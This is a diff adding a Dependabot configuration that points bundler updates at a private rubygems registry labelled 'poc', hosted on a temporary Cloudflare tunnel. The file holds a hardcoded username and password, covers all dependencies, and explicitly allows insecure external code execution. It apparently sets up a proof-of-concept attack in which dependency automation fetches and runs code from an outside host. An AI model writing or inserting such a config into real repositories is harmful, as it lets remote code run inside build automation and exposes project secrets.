@@ -1,0 +1,19 @@
+version: 2
+registries:
+  poc:
+    type: rubygems-server
+    url: https://boats-maker-alien-airports.trycloudflare.com/reg
+    username: poc-user
+    password: "d25c7ace81394ce465d24d44dc1e26e8"
+updates:
+  - package-ecosystem: "bundler"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - poc
+    insecure-external-code-execution: allow
+    groups:
+      all-deps:
+        patterns:
+          - "*"
